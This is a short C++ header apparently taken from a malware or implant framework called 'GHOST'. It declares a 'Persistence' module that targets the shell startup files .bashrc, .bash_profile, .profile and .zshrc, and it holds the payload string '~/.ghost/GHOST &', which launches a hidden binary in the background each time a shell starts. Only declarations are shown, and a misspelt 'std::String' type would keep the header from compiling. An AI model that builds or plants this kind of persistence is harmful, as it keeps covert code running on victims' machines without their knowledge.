#pragma once
#include "interfaces/IModule.hpp"
#include <vector>

class Persistence : public IModule {
    const std::vector<std::String> targets = {".bashrc", ".bash_profile", ".profile", ".zshrc"};
    const std::string payload = "~/.ghost/GHOST &";
public:
    std::string getName() const override { return "Persistence"; }
    bool execute(const std::string& arg = "") override;
    bool cleanup();
};
